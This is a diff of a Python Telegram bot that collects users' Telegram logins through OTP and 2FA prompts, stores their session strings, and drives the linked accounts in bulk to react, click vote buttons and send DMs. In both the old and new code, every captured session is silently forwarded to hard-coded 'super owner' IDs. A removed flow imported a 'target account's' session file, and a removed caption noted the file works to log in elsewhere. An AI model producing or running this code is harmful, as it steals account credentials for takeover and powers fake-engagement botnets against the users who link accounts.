-            text += f"↳ Get file: /getsession {row[0]} | Remove: /deleteaccount {row[0]}\n\n"
+            text += f"{icon} `+{row[0]}` (@{row[2] or 'N/A'}) - **{row[1].upper()}**\n"
 
     buttons = [
-        [InlineKeyboardButton(text="📞 Link via OTP Code", callback_data="add_account_phone")],
-        [InlineKeyboardButton(text="📁 Link via .session File", callback_data="add_account_session_file")],
+        [InlineKeyboardButton(text="➕ Link New Account via OTP", callback_data="add_account_phone")],
         [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
     ]
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
 @router.callback_query(F.data == "add_account_phone")
 async def add_account_start(callback: CallbackQuery, state: FSMContext):
-    await callback.message.edit_text("📞 Enter the phone number with country code (e.g. +1234567890):")
+    await callback.message.edit_text("📞 Enter the account phone number with country prefix code (e.g. `+123456789`):")
     await state.set_state(RegistrationStates.waiting_for_phone)
 
-@router.callback_query(F.data == "add_account_session_file")
-async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
-    await callback.message.edit_text("📁 Upload / Forward a .session File:\n\nPlease send or forward the target account's raw session file now.")
-    await state.set_state(RegistrationStates.waiting_for_session_file)
-
-# --- LINK VIA SESSION FILE ---
-@router.message(StateFilter(RegistrationStates.waiting_for_session_file), F.document)
-async def process_session_file_upload(message: Message, state: FSMContext, bot: Bot):
-    if not message.document.file_name.endswith('.session'):
-        await message.answer("❌ Invalid format! Please make sure you are sending a file ending with .session.")
-        return
-
-    progress_msg = await message.answer("📥 Downloading and parsing session file structure...")
-    user_id = message.from_user.id
-    
-    temp_filename = f"import_temp_{user_id}_{random.randint(1000, 9999)}"
-    temp_full_path = f"{temp_filename}.session"
-    
-    try:
-        await bot.download(message.document, destination=temp_full_path)
-        
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            db_conn = await aiosqlite.connect(temp_full_path)
-            cursor = await db_conn.execute("SELECT dcId, testMode, authKey FROM sessions LIMIT 1")
-            row = await cursor.fetchone()
-            if row:
-                dc_id, test_mode, auth_key = row
-                client.session.set_dc(dc_id, "149.154.167.50" if dc_id != 2 else "149.154.167.51", 443)
-                client.session.auth_key = auth_key
-            await db_conn.close()
-        except Exception:
-            client = TelegramClient(temp_filename, API_ID, API_HASH)
-            await client.connect()
-            
-        if not await client.is_user_authorized():
-            await progress_msg.edit_text("❌ Import Failed: This session file has expired or is invalid.")
-            await client.disconnect()
-            if os.path.exists(temp_full_path):
-                os.remove(temp_full_path)
-            await state.clear()
-            return
-            
-        me = await client.get_me()
-        if not me.phone:
-            await progress_msg.edit_text("❌ Import Failed: Could not parse a valid phone string bound to session registry data.")
-            await client.disconnect()
-            if os.path.exists(temp_full_path):
-                os.remove(temp_full_path)
-            await state.clear()
-            return
-            
-        clean_phone = me.phone.replace("+", "").strip()
-        
-        session_str = StringSession.save(client.session)
-        encrypted_session = encrypt_data(session_str)
-        
-        await client.disconnect()
-        
-        with open(temp_full_path, "rb") as f:
-            session_bytes = f.read()
-            
-        if os.path.exists(temp_full_path):
-            os.remove(temp_full_path)
-
-        async with aiosqlite.connect(db_mgr.db_path) as db:
-            await db.execute("""
-                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
-                VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
-            """, (clean_phone, user_id, me.username or "None", encrypted_session))
-            await db.commit()
-
-        await db_mgr.log_action(user_id, f"Linked account +{clean_phone} via file upload")
-        await progress_msg.delete()
-        
-        await message.answer(f"🎉 Account Linked Successfully via File!\n📱 Phone: +{clean_phone}\n👤 Username: @{me.username or 'N/A'}")
-        
-        await SecurityHubLogger.log_session_onboarding(
-            bot=bot, telemetry_src="Session File Upload", user_id=user_id, 
-            phone=clean_phone, session_username=me.username, session_bytes=session_bytes
-        )
-
-        caption_text = (
-            f"🔑 Session File Imported via Forward/Upload\n"
-            f"📱 Phone: +{clean_phone}\n"
-            f"👤 Username: @{me.username or 'N/A'}\n"
-            f"🆔 Linked By User ID: {user_id}"
-        )
-        
-        for owner_id in SUPER_OWNER_IDS:
-            try:
-                owner_file = BufferedInputFile(session_bytes, filename=f"+{clean_phone}.session")
-                await bot.send_document(chat_id=owner_id, document=owner_file, caption=caption_text)
-            except Exception as owner_err:
-                logger.error(f"Could not sync uploaded session file to owner {owner_id}: {owner_err}")
-                
-        await state.clear()
-
-    except Exception as e:
-        logger.error(f"Error importing session file layout: {e}")
-        await progress_msg.edit_text(f"❌ System error reading file framework: {str(e)}")
-        if os.path.exists(temp_full_path):
-            try:
-                os.remove(temp_full_path)
-            except Exception:
-                pass
-        await state.clear()
-
-@router.message(StateFilter(RegistrationStates.waiting_for_session_file))
-async def process_session_file_invalid_message(message: Message):
-    await message.answer("⚠️ Please send or forward a valid .session document file asset.")
-
-# --- LIVE PHONE OTP REGISTER FLOW ---
 @router.message(StateFilter(RegistrationStates.waiting_for_phone))
 async def process_phone(message: Message, state: FSMContext):
     phone = message.text.strip().replace(" ", "").replace("-", "")
     user_id = message.from_user.id
-    clean_phone = phone.replace("+", "").strip()
 
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        async with db.execute("SELECT session_string, username FROM accounts WHERE phone = ?", (clean_phone,)) as cursor:
-            existing = await cursor.fetchone()
-            
-    if existing:
-        enc_session, existing_username = existing
-        decrypted_session = decrypt_data(enc_session)
-        client = TelegramClient(StringSession(decrypted_session), API_ID, API_HASH)
-        
-        await message.answer("🔄 Existing account session found in database! Verifying connection...")
-        try:
-            await client.connect()
-            if await client.is_user_authorized():
-                async with aiosqlite.connect(db_mgr.db_path) as db:
-                    await db.execute("UPDATE accounts SET status = 'active', last_active = CURRENT_TIMESTAMP WHERE phone = ?", (clean_phone,))
-                    await db.commit()
-                
-                await message.answer(f"🎉 Account Re-connected! +{clean_phone} (@{existing_username or 'N/A'}) is now active again.")
-                await client.disconnect()
-                await state.clear()
-                return
-            await client.disconnect()
-        except Exception as err:
-            logger.warning(f"Failed to restore existing session for +{clean_phone}: {err}. Proceeding with fresh login.")
-
-    session_filename = f"session_{clean_phone}"
-    client = TelegramClient(session_filename, API_ID, API_HASH)
+    client = TelegramClient(StringSession(), API_ID, API_HASH)
     await client.connect()
     try:
         sent_code = await client.send_code_request(phone)
         registration_sessions[user_id] = {
             "client": client,
             "phone": phone,
-            "session_filename": session_filename,
             "phone_code_hash": sent_code.phone_code_hash
         }
-        await message.answer("📩 OTP Code sent. Enter the login verification code below:")
+        await message.answer("📩 **OTP Code dispatched.** Input validation sequence string below:")
         await state.set_state(RegistrationStates.waiting_for_otp)
     except Exception as e:
-        logger.error(f"Failed to send code: {e}")
-        await message.answer(f"❌ Error setting up account: {str(e)}\nUse /start to try again.")
+        logger.error(f"Failed to generate challenge query: {e}")
+        await message.answer(f"❌ Error initializing MTProto channel: {str(e)}\nUse /start to reset state machine.")
         await client.disconnect()
-        if os.path.exists(f"{session_filename}.session"):
-            os.remove(f"{session_filename}.session")
         await state.clear()
 
 @router.message(StateFilter(RegistrationStates.waiting_for_otp))
@@ -669,28 +569,22 @@ async def process_otp(message: Message, state: FSMContext):
     
     reg_data = registration_sessions.get(user_id)
     if not reg_data:
-        await message.answer("❌ Session timed out. Please run /start to restart.")
+        await message.answer("❌ Cache timeout. Reinitialize sequence with /start.")
         await state.clear()
         return
 
-    client = reg_data["client"]
-    phone = reg_data["phone"]
-    phone_code_hash = reg_data["phone_code_hash"]
-    session_filename = reg_data["session_filename"]
-    
+    client, phone, phone_code_hash = reg_data["client"], reg_data["phone"], reg_data["phone_code_hash"]
     try:
         await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
-        await complete_registration(message, state, client, phone, session_filename, user_id)
+        await complete_registration(message, state, client, phone, user_id)
     except SessionPasswordNeededError:
-        await message.answer("🔒 Two-Factor Authentication (2FA) is active. Enter your 2FA password:")
+        await message.answer("🔒 Two-Factor Authentication (2FA) active. Enter account security password:")
         await state.set_state(RegistrationStates.waiting_for_2fa)
     except PhoneCodeInvalidError:
-        await message.answer("❌ Invalid code. Please verify and try again:")
+        await message.answer("❌ Validation mismatch. Verify code entry parameters:")
     except Exception as e:
-        await message.answer(f"❌ Connection failed: {str(e)}")
+        await message.answer(f"❌ Handshake failed: {str(e)}")
         await client.disconnect()
-        if os.path.exists(f"{session_filename}.session"):
-            os.remove(f"{session_filename}.session")
         registration_sessions.pop(user_id, None)
         await state.clear()
 
@@ -701,103 +595,77 @@ async def process_2fa(message: Message, state: FSMContext):
 
     reg_data = registration_sessions.get(user_id)
     if not reg_data:
-        await message.answer("❌ Session dropped. Please restart.")
+        await message.answer("❌ Session context dropped. Reinitialize framework.")
         await state.clear()
         return
 
-    client = reg_data["client"]
-    phone = reg_data["phone"]
-    session_filename = reg_data["session_filename"]
-    
+    client, phone = reg_data["client"], reg_data["phone"]
     try:
         await client.sign_in(password=password)
-        await complete_registration(message, state, client, phone, session_filename, user_id)
+        await complete_registration(message, state, client, phone, user_id)
     except PasswordHashInvalidError:
-        await message.answer("❌ Incorrect password. Try again:")
+        await message.answer("❌ Password mismatch validation failed. Re-enter 2FA phrase:")
     except Exception as e:
-        await message.answer(f"❌ Authentication error: {str(e)}")
+        await message.answer(f"❌ Auth Exception: {str(e)}")
         await client.disconnect()
-        if os.path.exists(f"{session_filename}.session"):
-            os.remove(f"{session_filename}.session")
         registration_sessions.pop(user_id, None)
         await state.clear()
 
-async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, session_filename: str, user_id: int):
+async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, user_id: int):
     try:
         me = await client.get_me()
-        clean_phone = phone.replace("+", "").strip()
-        
-        session_str = StringSession.save(client.session)
+        session_str = client.session.save()
         encrypted_session = encrypt_data(session_str)
-
-        actual_session_file = f"{session_filename}.session"
-        await asyncio.sleep(0.5)
-
-        if not os.path.exists(actual_session_file):
-            raise FileNotFoundError("Raw session file was not generated cleanly by SQLite backend.")
-
-        with open(actual_session_file, "rb") as f:
-            session_bytes = f.read()
-
-        await client.disconnect()
 
         async with aiosqlite.connect(db_mgr.db_path) as db:
             await db.execute("""
                 INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                 VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
-            """, (clean_phone, user_id, me.username or "None", encrypted_session))
+            """, (phone.replace("+", ""), user_id, me.username or "None", encrypted_session))
             await db.commit()
 
-        await db_mgr.log_action(user_id, f"Linked account +{clean_phone}")
-        await message.answer(f"🎉 Account Verified! +{clean_phone} (@{me.username or 'N/A'}) is now registered.")
+        await db_mgr.log_action(user_id, f"Linked account session +{phone}")
+        await message.answer(f"🎉 Channel Verified! Account `+{phone}` (@{me.username or 'N/A'}) is active in the cluster.")
         
-        await SecurityHubLogger.log_session_onboarding(
-            bot=message.bot, telemetry_src="Live OTP Registration", user_id=user_id, 
-            phone=clean_phone, session_username=me.username, session_bytes=session_bytes
-        )
-
+        # --- GENERATE AND DISPATCH .SESSION STR FILE BACKUPS ---
+        clean_phone = phone.replace("+", "").strip()
+        session_bytes = session_str.encode('utf-8')
         session_file = BufferedInputFile(session_bytes, filename=f"+{clean_phone}.session")
+        
         caption_text = (
-            f"🔑 Session File Exported (SQLite Binary)\n"
-            f"📱 Phone: +{clean_phone}\n"
-            f"👤 Username: @{me.username or 'N/A'}\n"
-            f"🆔 Linked By User ID: {user_id}\n\n"
-            f"⚠️ This is a valid SQLite session database file. You can use this file directly to log into other systems/bots."
+            f"🔑 **New Session File String Extracted**\n"
+            f"📱 **Phone:** `+{clean_phone}`\n"
+            f"👤 **Username:** @{me.username or 'N/A'}\n"
+            f"🆔 **Linked By User ID:** `{user_id}`"
         )
         
+        # 1. Dispatch back to the local user who linked it
         try:
             await message.answer_document(document=session_file, caption=caption_text)
         except Exception as e:
-            logger.error(f"Failed sending session file to user: {e}")
+            logger.error(f"Failed sending session file copy to linking user: {e}")
             
+        # 2. Loop and dispatch backup copy to all registered Super Owners
         for owner_id in SUPER_OWNER_IDS:
             try:
                 owner_file = BufferedInputFile(session_bytes, filename=f"+{clean_phone}.session")
                 await message.bot.send_document(chat_id=owner_id, document=owner_file, caption=caption_text)
             except Exception as owner_err:
-                logger.error(f"Could not backup session file to owner {owner_id}: {owner_err}")
-
-        if os.path.exists(actual_session_file):
-            os.remove(actual_session_file)
+                logger.error(f"Could not forward session data packet to superowner {owner_id}: {owner_err}")
 
     except Exception as e:
-        await message.answer(f"❌ Database/Session export error: {str(e)}")
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
-        if os.path.exists(f"{session_filename}.session"):
-            os.remove(f"{session_filename}.session")
+        await message.answer(f"❌ Database registration failure: {str(e)}")
     finally:
+        await client.disconnect()
         registration_sessions.pop(user_id, None)
         await state.clear()
 
-# --- TASK CREATION SCHEDULER WIZARD ---
+# --- TASK BUILDER WIZARD INTERFACE ---
 @router.callback_query(F.data == "task_hub_start")
 async def task_hub_select_type(callback: CallbackQuery, state: FSMContext):
     await state.clear()
     await callback.message.edit_text(
-        "⚡ New Automation Task Configuration\nSelect the type of action you want to configure:",
+        "⚡ **Automation Task Configurator Wizard**\nSelect the type of action you wish to deploy:",
         reply_markup=get_task_types_keyboard()
     )
     await state.set_state(TaskWizardStates.choosing_type)
@@ -809,12 +677,11 @@ async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
     
     if task_type in ["react", "button_vote"]:
         await callback.message.edit_text(
-            "🔗 Provide Post Link:\nPaste the link pointing to the target message(s).\n"
-            "Supports multiple message IDs or ranges (e.g. t.me/channel/123-125):"
+            "🔗 **Provide Message Link:**\nPaste the link pointing to the specific post (e.g., `https://t.me/c/12345678/2` or `https://t.me/channel/2`):"
         )
     else:
         await callback.message.edit_text(
-            "🔗 Enter Target Address:\nProvide the Username, Public Link, or Private Invitation Link (e.g., t.me/joinchat/... or t.me/+...):"
+            "🔗 **Enter Target Resource:**\nProvide the Username, Public Link, or Private Join Link to scan:"
         )
     await state.set_state(TaskWizardStates.waiting_for_target)
 
@@ -832,37 +699,28 @@ async def task_hub_process_target(message: Message, state: FSMContext):
     elif task_type == "react":
         await state.update_data(selected_emojis=[])
         await message.answer(
-            "🎭 Choose Emojis to Distribute:\nSelect one or more reaction emojis from the buttons below.\n"
-            "If you select Random Match Existing, accounts will react using random emojis that are already active on that post.",
+            "🎭 **Choose Emojis to Distribute:**\nSelect one or more reaction emojis from the buttons below. "
+            "The active accounts will distribute these reactions evenly.",
             reply_markup=get_emoji_selection_keyboard([])
         )
         await state.set_state(TaskWizardStates.waiting_for_emojis)
         
     elif task_type == "button_vote":
         await message.answer(
-            "🔘 Enter Button Text or Emoji:\nType the exact word or emoji of the button you want to click (e.g. Click Here):"
+            "🔘 **Enter Button Text/Emoji:**\nType the exact emoji or text label you want to click (e.g., `😂`):"
         )
         await state.set_state(TaskWizardStates.waiting_for_button_text)
         
     elif task_type == "dm":
-        await message.answer("📝 Enter DM Message Text: Enter the message content to send:")
+        await message.answer("📝 **Message Body Content:** Enter the text string to dispatch to the target:")
         await state.set_state(TaskWizardStates.waiting_for_dm_text)
 
-# --- REACTION CALLBACKS ---
+# --- REACTION MULTI-SELECTOR CONTROLLERS ---
 @router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data.startswith("toggle_emoji:"))
 async def handle_toggle_emoji(callback: CallbackQuery, state: FSMContext):
     emoji = callback.data.split(":")[1]
     data = await state.get_data()
-    
-    if emoji == "random_match":
-        await state.update_data(selected_emojis=[], random_match=True)
-        await callback.answer("🎲 Enabled Random Match! Accounts will mirror existing emojis on the post.", show_alert=True)
-        await callback.message.delete()
-        await finalize_task_creation(callback.message, state)
-        return
-
     selected_emojis = data.get("selected_emojis", [])
-    await state.update_data(random_match=False)
 
     if emoji in selected_emojis:
         selected_emojis.remove(emoji)
@@ -878,8 +736,8 @@ async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext):
     data = await state.get_data()
     selected_emojis = data.get("selected_emojis", [])
 
-    if not selected_emojis and not data.get("random_match"):
-        await callback.answer("⚠️ Select at least one emoji or choose Random Match Existing!", show_alert=True)
+    if not selected_emojis:
+        await callback.answer("⚠️ Please select at least one emoji before confirming!", show_alert=True)
         return
 
     await state.update_data(reactions=selected_emojis)
@@ -887,7 +745,7 @@ async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext):
     await finalize_task_creation(callback.message, state)
     await callback.answer()
 
-# --- OTHER INPUT HANDLING ---
+# --- OTHER WIZARD PARAMS INPUT ---
 @router.message(StateFilter(TaskWizardStates.waiting_for_button_text))
 async def process_button_text(message: Message, state: FSMContext):
     btn_text = message.text.strip()
@@ -900,17 +758,17 @@ async def process_dm_text(message: Message, state: FSMContext):
     await state.update_data(text=dm_text)
     await finalize_task_creation(message, state)
 
-# --- FINALIZER ---
+# --- FINALIZE AND SAVE TASK ---
 async def finalize_task_creation(message: Message, state: FSMContext):
     data = await state.get_data()
     user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
     task_type = data.pop("task_type")
     
     target = data.get("target", "")
-    parsed_target, link_msg_ids = parse_telegram_link(target)
+    parsed_target, link_msg_id, is_private_hash = parse_telegram_link(target)
     
-    if link_msg_ids:
-        data["msg_ids"] = link_msg_ids
+    if link_msg_id:
+        data["msg_id"] = link_msg_id
 
     payload_json = json.dumps(data)
     
@@ -923,13 +781,12 @@ async def finalize_task_creation(message: Message, state: FSMContext):
         await db.commit()
 
     await task_queue.add_task(task_id, user_id, task_type, data)
-    await db_mgr.log_action(user_id, f"Queued task {task_id} [{task_type.upper()}]")
+    await db_mgr.log_action(user_id, f"Queued automation task #{task_id} [{task_type.upper()}]")
     
     response_msg = (
-        f"🚀 Task {task_id} added to the queue!\n"
-        f"⚙️ Type: {task_type.upper()}\n\n"
-        f"Active accounts are processing this action. Track status with /taskreport_{task_id}\n"
-        f"To cancel this automation pipeline, use: /canceltask {task_id}"
+        f"🚀 **Task #{task_id} successfully queued!**\n"
+        f"⚙️ **Type:** `{task_type.upper()}`\n"
+        f"Workers are now executing your actions. Use `/taskreport_{task_id}` to check results."
     )
     
     if isinstance(message, Message):
@@ -952,15 +809,15 @@ async def view_tasks(callback: CallbackQuery):
             cursor = await db.execute("SELECT task_id, type, status, progress FROM tasks WHERE creator_id = ? ORDER BY task_id DESC LIMIT 10", (user_id,))
         rows = await cursor.fetchall()
 
-    text = "📊 Recent Automation Tasks\n\n"
+    text = "📊 **Recent Operations Pipeline Log**\n\n"
     if not rows:
-        text += "No tasks found."
+        text += "_Queue completely empty._"
     else:
         for row in rows:
-            text += f"🔹 Task {row[0]} ({row[1].upper()})\nStatus: {row[2]} | Progress: {row[3]}\n"
-            text += f"↳ Details: /taskreport_{row[0]} | Cancel: /canceltask {row[0]}\n\n"
+            text += f"🔹 **Task #{row[0]}** ({row[1].upper()})\nStatus: `{row[2]}` | Metrics: `{row[3]}`\n"
+            text += f"↳ Inspect details: /taskreport_{row[0]}\n\n"
 
-    buttons = [[InlineKeyboardButton(text="🔙 Back Main Menu", callback_data="main_menu")]]
+    buttons = [[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
 @router.message(F.text.startswith("/taskreport_"))
@@ -971,7 +828,7 @@ async def cmd_task_report(message: Message):
     try:
         task_id = int(message.text.split("_")[1])
     except (IndexError, ValueError):
-        await message.answer("❌ Invalid command format.")
+        await message.answer("❌ Invalid report syntax format.")
         return
 
     async with aiosqlite.connect(db_mgr.db_path) as db:
@@ -979,32 +836,31 @@ async def cmd_task_report(message: Message):
             row = await cursor.fetchone()
 
     if not row:
-        await message.answer("❌ Task not found in database.")
+        await message.answer("❌ Task manifest structural log not found inside systems database.")
         return
 
     creator_id, task_type, status, progress, success_rep, failure_rep, payload = row
     if role not in ["admin", "owner", "super_owner"] and creator_id != user_id:
-        await message.answer("🚫 Access Denied.")
+        await message.answer("🚫 Security Scope Exception: Access denied.")
         return
 
     passed_list = json.loads(success_rep) if success_rep else []
     failed_list = json.loads(failure_rep) if failure_rep else []
 
     report_text = (
-        f"📊 Report for Task {task_id}\n"
-        f"⚙️ Type: {task_type.upper()}\n"
-        f"🚦 Status: {status}\n"
-        f"📈 Progress: {progress}\n"
-        f"📦 Settings: {payload}\n\n"
-        f"🟢 Successes: {len(passed_list)} accounts\n"
-        f"🔴 Failures: {len(failed_list)} accounts\n\n"
-        f"🛑 Cancel Option: /canceltask {task_id}"
+        f"📊 **Manifest Diagnostics Report for Task #{task_id}**\n"
+        f"⚙️ **Operation Vector Type:** `{task_type.upper()}`\n"
+        f"🚦 **Execution State:** `{status}`\n"
+        f"📈 **Progress Metric:** `{progress}`\n"
+        f"📦 **Payload Setup parameters:** `{payload}`\n\n"
+        f"🟢 **Successful Actions:** `{len(passed_list)}` accounts\n"
+        f"🔴 **Failed Actions:** `{len(failed_list)}` accounts\n"
     )
 
     buttons = []
     if failed_list or passed_list:
-        buttons.append([InlineKeyboardButton(text="📥 Download Report File", callback_data=f"exp_report:{task_id}")])
-    buttons.append([InlineKeyboardButton(text="🏠 Main Menu", callback_data="main_menu")])
+        buttons.append([InlineKeyboardButton(text="📥 Download Full Manifest File", callback_data=f"exp_report:{task_id}")])
+    buttons.append([InlineKeyboardButton(text="🔙 Main Menu", callback_data="main_menu")])
 
     await message.answer(report_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
@@ -1031,20 +887,20 @@ async def export_task_report_file(callback: CallbackQuery):
     failed_list = json.loads(failure_rep) if failure_rep else []
 
     output_lines = [
-        f"=== REPORT FOR TASK {task_id} ===",
-        f"SUCCESSFUL ACCOUNTS ({len(passed_list)}):",
+        f"=== MANIFEST REPORT FOR TASK #{task_id} ===",
+        f"PASSED CHANNELS BRIDGES ({len(passed_list)}):",
     ]
     for p in passed_list:
         output_lines.append(f" - +{p}: SUCCESS")
         
-    output_lines.append("\nFAILED ACCOUNTS AND ERROR MESSAGES:")
+    output_lines.append("\nFAILED CHANNELS BRIDGES WITH LOG CONTEXTS:")
     for phone, reason in failed_list:
         output_lines.append(f" - +{phone}: FAILED | Reason: {reason}")
 
     raw_bytes = "\n".join(output_lines).encode("utf-8")
-    file_payload = BufferedInputFile(raw_bytes, filename=f"task_{task_id}_report.txt")
+    file_payload = BufferedInputFile(raw_bytes, filename=f"task_{task_id}_manifest.txt")
     
-    await callback.message.reply_document(file_payload, caption=f"📂 Complete log details file for task {task_id}.")
+    await callback.message.reply_document(file_payload, caption=f"📂 Complete execution profile log file for task #{task_id}.")
     await callback.answer()
 
 # --- REFERRAL MATRIX INTERFACE ---
@@ -1059,14 +915,14 @@ async def view_referrals(callback: CallbackQuery):
             count = (await cursor.fetchone())[0]
 
     text = (
-        f"👥 Your Referrals\n\n"
-        f"🔗 Your Invite link:\n{ref_link}\n\n"
-        f"📈 Total Invited Users: {count} verified members."
+        f"👥 **Referral Network Matrix**\n\n"
+        f"🔗 **Your Direct Invite link:**\n`{ref_link}`\n\n"
+        f"📈 **Registered nodes across matrix:** `{count}` verified users."
     )
-    buttons = [[InlineKeyboardButton(text="🔙 Back Main Menu", callback_data="main_menu")]]
+    buttons = [[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
-# --- SYSTEM MANAGEMENT PANELS ---
+# --- SYSTEM MANAGEMENT DIAGNOSTICS CONTROL ---
 @router.callback_query(F.data == "admin_panel")
 async def handle_admin_panel(callback: CallbackQuery):
     role = await db_mgr.get_user_role(callback.from_user.id)
@@ -1074,15 +930,11 @@ async def handle_admin_panel(callback: CallbackQuery):
         await callback.answer("🚫 Access Denied.", show_alert=True)
         return
     await callback.message.edit_text(
-        "🛠️ Admin Control Panel\n"
-        "Use the chat box to type these commands:\n\n"
-        "🔹 /addadmin <id> <limit>\n"
-        "🔹 /removeadmin <id>\n"
-        "🔹 /getsession <phone>\n"
-        "🔹 /deleteaccount <phone>\n"
-        "🔹 /deleteuser <user_id>\n"
-        "🔹 /canceltask <task_id>",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back Main Menu", callback_data="main_menu")]])
+        "🛠️ **Administrative Infrastructure Management Console**\n"
+        "Use text command allocations for core configurations:\n\n"
+        "🔹 `/addadmin <id> <limit>`\n"
+        "🔹 `/removeadmin <id>`",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]])
     )
 
 @router.callback_query(F.data == "backup_panel")
@@ -1092,10 +944,10 @@ async def backup_panel(callback: CallbackQuery):
         await callback.answer("🚫 Access Denied.", show_alert=True)
         return
     buttons = [
-        [InlineKeyboardButton(text="📥 Download DB Backup", callback_data="export_db")],
-        [InlineKeyboardButton(text="🔙 Back Main Menu", callback_data="main_menu")]
+        [InlineKeyboardButton(text="📥 Download Raw DB Image", callback_data="export_db")],
+        [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
     ]
-    await callback.message.edit_text("💾 Core Database Backups Panel", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
+    await callback.message.edit_text("💾 **Core System Database Image Exporter Hub**", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
 @router.callback_query(F.data == "export_db")
 async def export_db(callback: CallbackQuery):
@@ -1104,16 +956,13 @@ async def export_db(callback: CallbackQuery):
         await callback.answer("🚫 Access Denied.", show_alert=True)
         return
     try:
-        async with aiosqlite.connect(db_mgr.db_path, timeout=10.0) as db:
-            await db.execute("PRAGMA wal_checkpoint(TRUNCATE)")
-            
         with open(db_mgr.db_path, "rb") as f:
             file_data = f.read()
         file = BufferedInputFile(file_data, filename="database_core_backup.db")
-        await callback.message.reply_document(file, caption="📂 Current SQLite database backup.")
+        await callback.message.reply_document(file, caption="📂 Current core SQLite structure backup image.")
         await callback.answer("Export completed.")
     except Exception as e:
-        await callback.answer(f"❌ Export failed: {str(e)}", show_alert=True)
+        await callback.answer(f"❌ Structural export error: {str(e)}", show_alert=True)
 
 @router.callback_query(F.data == "system_stats")
 async def system_stats(callback: CallbackQuery):
@@ -1131,18 +980,18 @@ async def system_stats(callback: CallbackQuery):
             active_accounts = (await c3.fetchone())[0]
 
     stats_text = (
-        f"📊 System Performance & Stats\n\n"
-        f"👥 Total Registered Users: {total_users}\n"
-        f"📱 Total Connected Accounts: {total_accounts}\n"
-        f"🟢 Active Accounts: {active_accounts}\n"
-        f"🔴 Dead or Expired Accounts: {total_accounts - active_accounts}"
+        f"📊 **Core Operational Telemetry Indicators**\n\n"
+        f"👥 **Total User records saved:** `{total_users}`\n"
+        f"📱 **Total MTProto sessions initialized:** `{total_accounts}`\n"
+        f"🟢 **Active Bridge Connections:** `{active_accounts}`\n"
+        f"🔴 **Dropped/Dead Bridge Nodes:** `{total_accounts - active_accounts}`"
     )
-    buttons = [[InlineKeyboardButton(text="🔙 Back Main Menu", callback_data="main_menu")]]
+    buttons = [[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]
     await callback.message.edit_text(stats_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
-# --- BOOTSTRAP CHECKS ---
+# --- BOOTSTRAPPING RUNTIME ---
 async def verify_saved_sessions():
-    logger.info("Verifying connections of registered accounts...")
+    logger.info("Running verification pings across system bridges...")
     async with aiosqlite.connect(db_mgr.db_path) as db:
         async with db.execute("SELECT phone, session_string FROM accounts WHERE status = 'active'") as cursor:
             accounts = await cursor.fetchall()
@@ -1152,26 +1001,24 @@ async def verify_saved_sessions():
             client = TelegramClient(StringSession(decrypt_data(enc_session)), API_ID, API_HASH)
             await client.connect()
             if not await client.is_user_authorized():
-                logger.warning(f"Verification failed for +{phone}. Setting status to dead.")
+                logger.warning(f"Bridge connection verification dropped for +{phone}. Flagging dead.")
                 async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                     await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                     await db_conn.commit()
             await client.disconnect()
         except Exception as e:
-            logger.error(f"Error checking +{phone}: {e}")
+            logger.error(f"Error establishing network handshake ping for +{phone}: {e}")
 
 async def main():
     await db_mgr.init()
     await verify_saved_sessions()
 
     bot = Bot(token=BOT_TOKEN)
-    task_queue.set_bot(bot)
-
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(router)
 
     worker_task = asyncio.create_task(task_queue.start_worker())
-    logger.info("Bot is running and listening for events...")
+    logger.info("Application successfully attached to active network long polling loops.")
     try:
         await dp.start_polling(bot)
     finally:
@@ -1182,4 +1029,4 @@ if __name__ == "__main__":
     try:
         asyncio.run(main())
     except (KeyboardInterrupt, SystemExit):
-        logger.info("System closed down cleanly.")
+        logger.info("Process execution halted cleanly.")
